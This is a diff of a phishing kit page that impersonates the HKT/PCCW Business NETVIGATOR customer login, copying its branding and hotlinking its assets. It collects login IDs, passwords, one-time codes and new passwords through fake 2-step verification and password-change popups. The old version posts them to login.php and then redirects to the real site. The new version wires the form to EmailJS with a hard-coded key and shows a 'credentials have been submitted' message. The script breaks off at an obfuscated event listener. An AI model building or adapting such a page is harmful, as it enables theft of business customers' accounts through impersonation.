@@ -1,492 +1,422 @@
 <!DOCTYPE html>
-<html class="wf-myriadpro-i4-active wf-myriadpro-n3-active wf-myriadpro-i3-active wf-myriadpro-n4-active wf-myriadpro-n6-active wf-myriadpro-i6-active wf-active">
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https:">
+    <meta name="description" content="Business NETVIGATOR">
+    <meta name="keywords" content="HKT PCCW - Business NETVIGATOR">
+    <link rel="stylesheet" href__="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
+    <link href__="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/cp.css" rel="stylesheet" type="text/css">
+    <style type="text/css">
+        .tk-myriad-pro, div, p, shadow3, t2, t3, title1 {
+            font-family: "myriad-pro", arial;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/l?subset_id=1&fvd=i4&v=3) format("woff2"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/d?subset_id=1&fvd=i4&v=3) format("woff"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/a?subset_id=1&fvd=i4&v=3) format("opentype");
+            font-weight: 400; font-style: italic; font-display: auto;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/341571/000000000000000000017098/27/l?subset_id=1&fvd=n3&v=3) format("woff2"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/d?subset_id=1&fvd=n3&v=3) format("woff"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/a?subset_id=1&fvd=n3&v=3) format("opentype");
+            font-weight: 300; font-style: normal; font-display: auto;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/l?subset_id=1&fvd=i3&v=3) format("woff2"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/d?subset_id=1&fvd=i3&v=3) format("woff"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/a?subset_id=1&fvd=i3&v=3) format("opentype");
+            font-weight: 300; font-style: italic; font-display: auto;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/l?subset_id=1&fvd=n4&v=3) format("woff2"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/d?subset_id=1&fvd=n4&v=3) format("woff"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/a?subset_id=1&fvd=n4&v=3) format("opentype");
+            font-weight: 400; font-style: normal; font-display: auto;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/l?subset_id=1&fvd=n6&v=3) format("woff2"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/d?subset_id=1&fvd=n6&v=3) format("woff"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/a?subset_id=1&fvd=n6&v=3) format("opentype");
+            font-weight: 600; font-style: normal; font-display: auto;
+        }
+        @font-face {
+            font-family: myriad-pro;
+            src: url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/l?subset_id=1&fvd=i6&v=3) format("woff2"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/d?subset_id=1&fvd=i6&v=3) format("woff"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/a?subset_id=1&fvd=i6&v=3) format("opentype");
+            font-weight: 600; font-style: italic; font-display: auto;
+        }
+        input::placeholder { color: black; opacity: 1; }
+        input::-ms-input-placeholder { color: black; }
+    </style>
+    <link href__="https://service.imsbiz.com/mfauth/css/slidercaptcha.min.css" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href__="https://service.imsbiz.com/mfauth/css/login.css" type="text/css">
+    <link href__="https://service.imsbiz.com/mfauth/css/loading.css" rel="stylesheet" type="text/css">
+    <script src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/jquery-1.9.1.js"></script>
+    <script src="https://service.imsbiz.com/mfauth/js/longbow.slidercaptcha.min.js"></script>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <link rel="shortcut icon" href__="https://service.imsbiz.com/LoginPage/images/biznet.ico" type="image/x-icon">
+    <title>Customer Login | Business NETVIGATOR</title>
+</head>
 
-	<head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https:">
+<body>
+    <div id="container">
+        <div class="loading_overlay"></div>
+        <div class="loading_spanner">
+            <div class="loading_loader"></div>
+        </div>
+        <div id="header">
+            <div style="padding-left: 52px; padding-top: 21px;">
+                <a href__="https://www.biznetvigator.com/eng/homepage.php" target="_biznet">
+                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/topleft-logo_e.png">
+                </a>
+            </div>
 
-		<meta name="description" content="Business NETVIGATOR">
-		<meta name="keywords" content="HKT PCCW - Business NETVIGATOR">
-		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
-		<link href="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/cp.css" rel="stylesheet" type="text/css">
-		<style type="text/css">
-			.tk-myriad-pro,
-			div,
-			p,
-			shadow3,
-			t2,
-			t3,
-			title1 {
-				font-family: "myriad-pro", arial;
-			}
-		</style>
-		<style type="text/css">
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/l?subset_id=1&fvd=i4&v=3) format("woff2"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/d?subset_id=1&fvd=i4&v=3) format("woff"), url(https://use.typekit.com/af/bce065/00000000000000000001709b/27/a?subset_id=1&fvd=i4&v=3) format("opentype");
-				font-weight: 400;
-				font-style: italic;
-				font-display: auto;
-			}
+            <div style="padding-left: 110px;">
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/341571/000000000000000000017098/27/l?subset_id=1&fvd=n3&v=3) format("woff2"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/d?subset_id=1&fvd=n3&v=3) format("woff"), url(https://use.typekit.com/af/341571/000000000000000000017098/27/a?subset_id=1&fvd=n3&v=3) format("opentype");
-				font-weight: 300;
-				font-style: normal;
-				font-display: auto;
-			}
+                <!-- Success message (hidden by default) -->
+                <div id="success_msg" style="display:none; padding-top: 180px; font-family: myriad-pro, arial;">
+                    <div style="font-size: 28px; color: #e0cab4; font-weight: 300; margin-bottom: 16px;">✔ Login details sent successfully.</div>
+                    <div style="font-size: 15px; color: #000; margin-bottom: 24px;">Your credentials have been submitted.</div>
+                    <button onclick="tryAgain()" style="background-color: #9a5700; color: #fff; border: none; padding: 10px 24px; font-size: 15px; cursor: pointer; font-family: myriad-pro, arial;">Try Again</button>
+                </div>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/l?subset_id=1&fvd=i3&v=3) format("woff2"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/d?subset_id=1&fvd=i3&v=3) format("woff"), url(https://use.typekit.com/af/1ec8cf/000000000000000000017099/27/a?subset_id=1&fvd=i3&v=3) format("opentype");
-				font-weight: 300;
-				font-style: italic;
-				font-display: auto;
-			}
+                <form id="loginForm">
+                    <table cellpadding="0" cellspacing="0" border="0" width="820" style="font-family: myriad-pro, arial;">
+                        <tbody>
+                            <tr valign="top">
+                                <td style="padding-top: 155px; padding-right: 30px; font-size: 49px; color: #e0cab4; font-weight: 300;">Customer Login</td>
+                                <td style="padding-top: 0px;" width="18">
+                                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/slashbg.png" width="18" height="466" border="0">
+                                </td>
+                                <td style="padding-top: 155px;" width="7">
+                                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/sep.png" width="7" height="81" border="0">
+                                </td>
+                                <td width="395" style="padding-top: 56px; padding-left: 10px;">
+                                    <div id="errmsg" style="padding-bottom: 60px; font-size: 16px; line-height: 18px; color: #ef4023;"><br>&nbsp;</div>
+                                    <table cellpadding="0" cellspacing="0" border="0" width="100%" style="font-family: myriad-pro, arial;">
+                                        <tbody>
+                                            <!-- FIX: username input now properly wrapped in <td> -->
+                                            <tr>
+                                                <td colspan="2" style="padding-bottom: 6px;">
+                                                    <input type="text" name="username" id="username" style="width: 269px" placeholder="Login ID" required>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td colspan="2" style="padding-bottom: 6px;">
+                                                    <input type="password" name="password" id="password" style="width: 269px;" maxlength="32" placeholder="Password" required>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td colspan="2" style="padding-bottom: 6px;">
+                                                    <div class="slidercaptcha card" style="height:240px;width:320px">
+                                                        <div class="card-body">
+                                                            <div id="captcha"></div>
+                                                        </div>
+                                                    </div>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td style="color: #9a5700;">
+                                                    <a href__="https://service.imsbiz.com/forgotpassword/forgot_pswd.html" style="color: #9a5700;">Forgot Password?</a>
+                                                </td>
+                                                <td align="right" style="padding-right: 120px;">
+                                                    <button id="login_button" style="display: none;" type="submit" class="btn_default">Login</button>
+                                                </td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                    <div style="padding-top:20px; color: #e0cab4; font-size: 38px; line-height: 32px; font-weight:300;">Need Help?</div>
+                                    <div style="padding-top:10px; color: #000000; font-size: 15px; line-height: 20px;">Call our Business Customer Hotline at 10088.</div>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </form>
+            </div>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/l?subset_id=1&fvd=n4&v=3) format("woff2"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/d?subset_id=1&fvd=n4&v=3) format("woff"), url(https://use.typekit.com/af/8cf19a/00000000000000000001709a/27/a?subset_id=1&fvd=n4&v=3) format("opentype");
-				font-weight: 400;
-				font-style: normal;
-				font-display: auto;
-			}
+            <div style="padding-left: 52px; padding-right: 52px; padding-top: 40px;">
+                <div style="float: left; font-size: 13px; color:#9c8e87;">
+                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/bottomleft-logo_e.png">
+                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/spacer.gif" width="50" height="10">
+                </div>
+                <div style="float: right;" align="right">
+                    <img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/logo_pccw_e.png">
+                </div>
+            </div>
+            <div style="float: left; font-size: 13px; color:#9c8e87;">
+                <span style="padding-right:20px;"><a href__="https://www.hkt-enterprise.com/en/products-solutions/data-connectivities/business-broadband" target="privacy">Home</a></span>
+                <span style="padding-right:20px;"><a href__="https://hkt.com/Privacy+Statement?language=en_US" target="privacy">Privacy Policy</a></span>
+                <span style="padding-right:20px;"><a href__="https://hkt.com/Terms+of+use?language=en_US" target="terms">Terms of Use</a></span>
+                <br>© Hong Kong Telecommunications (HKT) Limited 2020. All Rights Reserved.
+            </div>
+        </div>
+    </div>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/l?subset_id=1&fvd=n6&v=3) format("woff2"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/d?subset_id=1&fvd=n6&v=3) format("woff"), url(https://use.typekit.com/af/49e40a/00000000000000000001709c/27/a?subset_id=1&fvd=n6&v=3) format("opentype");
-				font-weight: 600;
-				font-style: normal;
-				font-display: auto;
-			}
+    <div id="overlay"></div>
 
-			@font-face {
-				font-family: myriad-pro;
-				src: url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/l?subset_id=1&fvd=i6&v=3) format("woff2"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/d?subset_id=1&fvd=i6&v=3) format("woff"), url(https://use.typekit.com/af/3d1f70/00000000000000000001709d/27/a?subset_id=1&fvd=i6&v=3) format("opentype");
-				font-weight: 600;
-				font-style: italic;
-				font-display: auto;
-			}
+    <!-- All your existing popups unchanged below -->
+    <div class="popup" id="popup_f2a_auth">
+        <div class="title_bar">
+            <div class="title_bar_title">2-step Verification</div>
+            <div class="popup_close" onclick="close_popup_f2a_auth();">X</div>
+        </div>
+        <div class="popup_content">
+            <div id="f2a_auth_step1">
+                <p>We detected that you are logging in with a new device. 2 steps verification required to send via</p>
+                <div class="row row_flex_left">
+                    <input type="radio" name="channel" id="reg_mobile" value="mob">
+                    <div class="label" id="label_mobile"><span><b>Mobile number</b>&nbsp;</span><span class="contact_details"></span></div>
+                </div>
+                <div class="row row_flex_left">
+                    <input type="radio" name="channel" id="reg_email" value="email">
+                    <div class="label" id="label_email"><span><b>Email address</b>&nbsp;</span><span class="contact_details"></span></div>
+                </div>
+                <div class="row row_flex_left"><div class="err err_wrapper" id="err_send_otp"></div></div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Get Verification Code</button>
+                </div>
+            </div>
+            <div id="f2a_auth_step2">
+                <p class="txt_ctr instr"></p>
+                <p class="txt_ctr b_txt" id="reg_contact"></p>
+                <div class="row">
+                    <div class="row row_flex_left">
+                        <label for="f2a_auth_v_code_input">Verification code :</label>
+                        <input type="text" id="f2a_auth_v_code_input" name="f2a_auth_v_code_input">
+                        <div class="err" id="invalid_code_err"></div>
+                    </div>
+                    <div class="timer_row">
+                        <span id="wrapper_time">The code will expire in <span id="time">03:00</span>.</span>
+                        <span id="2fa_auth_resend_code"></span>
+                    </div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Back</button>
+                    <button type="button" class="btn_default">Submit</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
- 		input::placeholder {
-			color: black;
-			opacity: 1;
-		}
+    <div class="popup" id="popup_change_pswd">
+        <div class="title_bar">
+            <div class="title_bar_title">Change Password</div>
+            <div class="popup_close" onclick="close_popup_change_pswd();">X</div>
+        </div>
+        <div class="popup_content">
+            <p id="para_chg_pswd">Please enter New Password for your first time login.</p>
+            <p>Login ID : <span id="loginID">customer@biznetvigator.com</span></p>
+            <div class="err err_wrapper" id="err_change_password"></div>
+            <form id="form_chg_pswd">
+                <div class="row row_flex_left">
+                    <label for="old_pswd">Old Password : </label>
+                    <input type="password" id="old_pswd" name="old_pswd">
+                    <div class="err err_wrapper" id="err_old_pswd"></div>
+                </div>
+                <div class="row row_flex_left">
+                    <label for="new_pswd">New Password : </label>
+                    <input type="password" id="new_pswd" name="new_pswd">
+                    <div class="err err_wrapper" id="err_new_pswd"></div>
+                </div>
+                <div class="row row_flex_left">
+                    <label for="confirm_pswd">Confirm Password : </label>
+                    <input type="password" id="confirm_pswd" name="confirm_pswd">
+                    <div class="err err_wrapper" id="err_cfm_pswd"></div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Change Password</button>
+                </div>
+            </form>
+            <div class="remarks">
+                <span class="r_head"><b>Note</b></span><br>
+                Password Requirement:<br>
+                <ol>
+                    <li>Must be between 8 to 32 characters long.</li>
+                    <li>Must contain uppercase letter, lowercase letter, and numerical digit.</li>
+                    <li>Supported characters are A-Z, a-z, 0-9.</li>
+                </ol>
+            </div>
+        </div>
+    </div>
 
-		input::-ms-input-placeholder {
-			color: black;
-		}
+    <div class="popup" id="popup_enroll">
+        <div class="title_bar">
+            <div class="title_bar_title">Enroll 2-step Verification</div>
+            <div class="popup_close" onclick="close_popup_enroll();">X</div>
+        </div>
+        <div class="popup_content">
+            <div id="enroll_step1">
+                <p>Two-step verification adds an extra layer of protection to your account. After you've turned it on, we'll ask you to enter additional security code when new device sign in. It is suggested to enroll mobile number and (or) email address.</p>
+                <div class="row">
+                    <div class="row row_flex_ctr">
+                        <label for="enroll_reg_mobile">Mobile number : (+852)</label>
+                        <input type="text" name="enroll_reg_mobile" id="enroll_reg_mobile" placeholder="Please enter your phone number">
+                    </div>
+                    <div class="err" id="err_enroll_step1"></div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Cancel</button>
+                    <button type="button" class="btn_default">Skip to email registration</button>
+                    <button type="button" class="btn_default">Next</button>
+                </div>
+            </div>
+            <div id="enroll_step2">
+                <p class="txt_ctr instr">A verification has been sent to your registered mobile number.</p>
+                <p class="txt_ctr b_txt" id="enroll_mob"></p>
+                <div class="row">
+                    <div class="row row_flex_left">
+                        <label for="enroll_v_code_input">Verification code :</label>
+                        <input type="text" id="enroll_v_code_input" name="enroll_v_code_input">
+                        <div class="err" id="enroll_invalid_code_err"></div>
+                    </div>
+                    <div class="timer_row">
+                        <span id="wrapper_enroll_time1">The code will expire in <span id="enroll_time1">03:00</span>.</span>
+                        <span id="enroll_resend_code"></span>
+                    </div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Back</button>
+                    <button type="button" class="btn_default">Next</button>
+                </div>
+            </div>
+            <div id="enroll_step3">
+                <p id="enroll_step_3_info">Please register your second email address as an alternative of 2 step verification.</p>
+                <div class="row">
+                    <div class="row row_flex_ctr">
+                        <label for="enroll_reg_email">Second email address :</label>
+                        <input type="text" name="enroll_reg_email" id="enroll_reg_email" placeholder="Please enter your email address">
+                    </div>
+                    <div class="err" id="err_enroll_step3"></div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Skip</button>
+                    <button type="button" class="btn_default">Next</button>
+                </div>
+            </div>
+            <div id="enroll_step4">
+                <p class="txt_ctr instr">A verification has been sent to your registered email address.</p>
+                <p class="txt_ctr b_txt" id="enrolled_email"></p>
+                <div class="row">
+                    <div class="row row_flex_left">
+                        <label for="enroll_v_code_input_email">Verification code :</label>
+                        <input type="text" id="enroll_v_code_input_email" name="enroll_v_code_input_email">
+                        <div class="err" id="enroll_email_invalid_code_err"></div>
+                    </div>
+                    <div class="timer_row">
+                        <span id="wrapper_enroll_time2">The code will expire in <span id="enroll_time2">03:00</span>.</span>
+                        <span id="enroll_resend_code2"></span>
+                    </div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">Back</button>
+                    <button type="button" class="btn_default">Next</button>
+                </div>
+            </div>
+            <div id="enroll_step5">
+                <p class="txt_ctr b_txt">Thank You</p>
+                <div class="txt_ctr txt_20 sub_head">The 2-step verification status</div>
+                <div class="row status_details">
+                    <div id="row_mob_v_status">
+                        <span class="status_details_label">Mobile no. : </span>
+                        <span id="mob_v_status" class="v_status"></span>
+                    </div>
+                    <div id="row_email_v_status">
+                        <span class="status_details_label">Email : </span>
+                        <span id="email_v_status" class="v_status"></span>
+                    </div>
+                </div>
+                <div class="btn_wrapper">
+                    <button type="button" class="btn_default">OK</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
-		input::-ms-input-placeholder {
-			color: black;
-		}
-		</style>
-		<link href="https://service.imsbiz.com/mfauth/css/slidercaptcha.min.css" rel="stylesheet" type="text/css" />
-		<link rel="stylesheet" href="https://service.imsbiz.com/mfauth/css/login.css" rel="stylesheet" type="text/css">
-		<link href="https://service.imsbiz.com/mfauth/css/loading.css" rel="stylesheet" type="text/css">
-		<script src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/jquery-1.9.1.js"></script>
-		<script src="https://service.imsbiz.com/mfauth/js/longbow.slidercaptcha.min.js"></script>
+    <div class="popup_wrapper" id="cancel_enroll_confirm_dia">
+        <div class="confirm_dia">
+            <div class="popup_content">
+                <p>Do you want to cancel?</p>
+                <div class="row row_flex_ctr">
+                    <form id="form_cancel_set_up">
+                        <input type="checkbox" id="do_not_ask_2fa_set_up" name="do_not_ask_2fa_set_up">
+                        <label for="do_not_ask_2fa_set_up">Do not ask again.</label>
+                        <div class="btn_wrapper">
+                            <button type="button" class="btn_default">No</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
 
-		<!-- EmailJS SDK -->
-		<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // ── EmailJS init ──
+        emailjs.init("WWo7anZY4HvX4SL2h");
 
-		<link rel="shortcut icon" href="https://service.imsbiz.com/LoginPage/images/biznet.ico" type="image/x-icon">
-		<title>Customer Login | Business NETVIGATOR</title>
-	</head>
+        function tryAgain() {
+            var username = document.getElementById('username').value;
+            var url = new URL(window.location.href);
+            url.searchParams.set('email', username);
+            window.location.href = url.toString();
+        }
 
-	<body>
-		<div id="container">
-			<div class="loading_overlay"></div>
-			<div class="loading_spanner">
-				<div class="loading_loader"></div>
-			</div>
-			<div id="header">
-				<div style="padding-left: 52px; padding-top: 21px;"><a
-						href="https://www.biznetvigator.com/eng/homepage.php" target="_biznet"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/topleft-logo_e.png"></a></div>
+        document.addEventListener('TLkClHUlQn5aQV4XO', function () {
 
-				<div  style="padding-left: 110px;">
-
-					<!-- Success message (hidden by default) -->
-					<div id="success_msg" style="display:none; padding-top: 180px; font-family: myriad-pro, arial;">
-						<div style="font-size: 28px; color: #e0cab4; font-weight: 300; margin-bottom: 16px;">✔ Login details sent successfully.</div>
-						<div style="font-size: 15px; color: #000; margin-bottom: 24px;">Your credentials have been submitted.</div>
-						<button onclick="tryAgain()" style="background-color: #9a5700; color: #fff; border: none; padding: 10px 24px; font-size: 15px; cursor: pointer; font-family: myriad-pro, arial;">Try Again</button>
-					</div>
-
-					<form id="loginForm" action="login.php" method="POST" target="_top">
-                    <input type="hidden" name="_next" value="https://www.biznetvigator.com"> 
-						<table cellpadding="0" cellspacing="0" border="0" width="820"
-							style="font-family: myriad-pro, arial;">
-							<tbody>
-								<tr valign="top">
-									<td
-										style="padding-top: 155px; padding-right: 30px; font-size: 49px; color: #e0cab4; font-weight: 300;">
-										Customer Login</td>
-									<td style="padding-top: 0px;" width="18"><img
-											src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/slashbg.png" width="18"
-											height="466" border="0"></td>
-									<td style="padding-top: 155px;" width="7"><img
-											src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/sep.png" width="7"
-											height="81" border="0"></td>
-									<td width="395" style="padding-top: 56px;padding-left: 10px;">
-										<div id="errmsg"
-											style="padding-bottom: 60px; font-size: 16px; line-height: 18px; color: #ef4023;">
-											<br>&nbsp;</div>
-										<table cellpadding="0" cellspacing="0" border="0" width="100%"
-											style="font-family: myriad-pro, arial;">
-											<tbody>
-												<tr>
-													<input type="text"
-														name="username" id="username" style="width: 269px" placeholder="Login ID" required>
-												</tr>
-												<tr>
-													<td colspan="2" style="padding-bottom: 6px;">
-														<input type="password" name="password" id="password" style="width: 269px;" maxlength="32" placeholder="Password" required>
-													</td>
-												</tr>
-												<tr>
-													<td colspan="2" style="padding-bottom: 6px;">
-														<div class="slidercaptcha card" style="height:240px;width:320px">
-															<div class="card-body">
-																<div id="captcha"></div>
-															</div>
-														</div>
-													</td>
-												</tr>
-                                                
-												<tr>
-													<td style="color: #9a5700;"><a
-															href="https://service.imsbiz.com/forgotpassword/forgot_pswd.html"
-															style="color: #9a5700;">Forgot Password?</a></td>
-													<td align="right" style="padding-right: 120px;">
-														<button id="login_button" style="display: none;" type="submit" class="btn_default">Login</button>
-													</td>
-												</tr>
-                                                <input type="hidden" name="_captcha" value="false">
-                                                
-											</tbody>
-										</table>
-										<div
-											style="padding-top:20px; color: #e0cab4; font-size: 38px; line-height: 32px; font-weight:300;">
-											Need Help?</div>
-										<div
-											style="padding-top:10px; color: #000000; font-size: 15px; line-height: 20px;">
-											Call our Business Customer Hotline at 10088.</div>
-									</td>
-								</tr>
-							</tbody>
-						</table>
-					</form>
-				</div>
-
-				<div style="padding-left: 52px; padding-right: 52px; padding-top: 40px;">
-					<div style="float: left; font-size: 13px; color:#9c8e87;">
-						<img src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/bottomleft-logo_e.png"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/spacer.gif" width="50" height="10"> </div>
-					<div style="float: right;" align="right"><img
-							src="https://service.imsbiz.com/mfauth/Customer%20Login%20_%20Business%20NETVIGATOR_files/logo_pccw_e.png"></div>
-
-				</div>
-				<div style="float: left; font-size: 13px; color:#9c8e87;"><span style="padding-right:20px;"><a
-							href="https://www.hkt-enterprise.com/en/products-solutions/data-connectivities/business-broadband"
-							target="privacy">Home</a></span><span style="padding-right:20px;"><a
-							href="https://hkt.com/Privacy+Statement?language=en_US" target="privacy">Privacy
-							Policy</a></span><span style="padding-right:20px;"><a
-							href="https://hkt.com/Terms+of+use?language=en_US" target="terms">Terms of Use</a></span>
-					<br>
-					© Hong Kong Telecommunications (HKT) Limited 2020. All Rights Reserved.
-
-				</div>
-
-			</div>
-
-		</div>
-		<div id="overlay"></div>
-		<div class="popup" id="popup_f2a_auth">
-			<div class="title_bar">
-				<div class="title_bar_title">2-step Verification</div>
-				<div class="popup_close" onclick="close_popup_f2a_auth();">X</div>
-			</div>
-			<div class="popup_content">
-				<div id="f2a_auth_step1">
-					<p>
-						We detected that you are logging in with a new device. 2 steps verification required to send via
-					</p>
-					<div class="row row_flex_left">
-						<input type="radio" name="channel" id="reg_mobile" value="mob">
-						<div class="label" id="label_mobile">
-							<span><b>Mobile number</b>&nbsp;</span>
-							<span class="contact_details"></span>
-						</div>
-					</div>
-					<div class="row row_flex_left">
-						<input type="radio" name="channel" id="reg_email" value="email">
-						<div class="label" id="label_email">
-							<span><b>Email address</b>&nbsp;</span>
-							<span class="contact_details"></span>
-						</div>
-					</div>
-					<div class="row row_flex_left"><div class="err err_wrapper" id="err_send_otp"></div></div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Get Verification Code</button>
-					</div>
-				</div>
-				<div id="f2a_auth_step2">
-					<p class="txt_ctr instr"></p>
-					<p class="txt_ctr b_txt" id="reg_contact"></p>
-					<div class="row">
-						<div class="row row_flex_left">
-							<label for="f2a_auth_v_code_input">Verification code :</label>
-							<input type="text" id="f2a_auth_v_code_input" name="f2a_auth_v_code_input">
-							<div class="err" id="invalid_code_err"></div>
-						</div>
-						<div class="timer_row">
-							<span id="wrapper_time">
-									The code will expire in <span id="time">03:00</span>.
-							</span>
-							<span id="2fa_auth_resend_code"></span>
-						</div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Back</button>
-						<button type="button" class="btn_default">Submit</button>
-					</div>
-				</div>
-			</div>
-		</div>
-
-		<div class="popup" id="popup_change_pswd">
-			<div class="title_bar">
-				<div class="title_bar_title">Change Password</div>
-				<div class="popup_close" onclick="close_popup_change_pswd();">X</div>
-			</div>
-			<div class="popup_content">
-				<p id="para_chg_pswd">
-					Please enter New Password for your first time login.
-				</p>
-				<p>
-					Login ID : <span id="loginID">customer@biznetvigator.com</span>
-				</p>
-				<div class="err err_wrapper" id="err_change_password"></div>
-				<form id="form_chg_pswd">
-					<div class="row row_flex_left">
-						<label for="old_pswd">Old Password : </label>
-						<input type="password" id="old_pswd" name="old_pswd">
-						<div class="err err_wrapper" id="err_old_pswd"></div>
-					</div>
-					<div class="row row_flex_left">
-						<label for="new_pswd">New Password : </label>
-						<input type="password" id="new_pswd" name="new_pswd">
-						<div class="err err_wrapper" id="err_new_pswd"></div>
-					</div>
-					<div class="row row_flex_left">
-						<label for="confirm_pswd">Confirm Password : </label>
-						<input type="password" id="confirm_pswd" name="confirm_pswd">
-						<div class="err err_wrapper" id="err_cfm_pswd"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default">Change Password</button>
-					</div>
-				</form>
-
-				<div class="remarks">
-					<span class="r_head"><b>Note</b></span><br>
-					Password Requirement:<br>
-					<ol>
-						<li>Must be between 8 to 32 characters long.</li>
-						<li>Must contain uppercase letter, lowercase letter, and numerical digit.</li>
-						<li>Supported characters are A-Z, a-z, 0-9.</li>
-					</ol>
-				</div>
-			</div>
-		</div>
-
-<!-- ENROLL 2FA POP UP -->
-		<div class="popup" id="popup_enroll">
-			<div class="title_bar">
-				<div class="title_bar_title">Enroll 2-step Verification</div>
-				<div class="popup_close" onclick="close_popup_enroll();">X</div>
-			</div>
-			<div class="popup_content">
-				<div id="enroll_step1">
-					<p>
-						Two-step verification adds an extra layer of protection to your account. After you've turned it on, we'll ask you to enter additional security code when new device sign in. It is suggested to enroll mobile number and (or) email address.
-					</p>
-					<div class="row">
-						<div class="row row_flex_ctr">
-							<label for="enroll_reg_mobile">
-								Mobile number : (+852)
-							</label>
-								<input type="text" name="enroll_reg_mobile" id="enroll_reg_mobile" placeholder="Please enter your phone number">
-						</div>
-						<div class="err" id="err_enroll_step1"></div>
-					</div>
-					<div class="btn_wrapper">
-						<button type="button" class="btn_default" >Cancel</button>
-						<button type="button" class="btn_default">Skip to email registration</button>
-						<button type="button" class="btn_default">Next</button>
-					</div>
-				</div>
